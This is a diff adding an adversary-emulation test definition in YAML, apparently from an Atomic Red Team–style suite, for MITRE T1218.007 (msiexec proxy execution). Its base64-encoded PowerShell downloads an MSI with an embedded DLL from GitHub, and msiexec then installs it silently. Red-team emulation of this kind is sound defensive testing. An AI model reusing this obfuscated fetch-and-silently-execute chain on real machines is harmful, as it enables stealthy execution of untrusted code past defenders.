@@ -1,0 +1,18 @@
+- id: be4eda6f-2f23-567b-957a-a559eb27e575
+  name: Soumaia ART Tests - Msiexec.exe - Execute Local MSI file with an embedded DLL
+  description: Executes an MSI containing an embedded DLL using msiexec.exe
+  tactic: stealth
+  technique:
+    attack_id: T1218.007
+    name: 'Signed Binary Proxy Execution: Msiexec'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAyADEAOAAuADAAMAA3AF8ARABMAEwALgBtAHMAaQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMgAxADgALgAwADAANwBfAEQATABMAC4AbQBzAGkAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAyADEAOAAuADAAMAA3AC8AYgBpAG4ALwBUADEAMgAxADgALgAwADAANwBfAEQATABMAC4AbQBzAGkAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAFQAMQAyADEAOAAuADAAMAA3AF8ARABMAEwALgBtAHMAaQAiAAoA
+          )
+          c:\windows\system32\msiexec.exe /q /i ".\T1218.007_DLL.msi"
+        payloads:
+        - T1218.007_DLL.msi
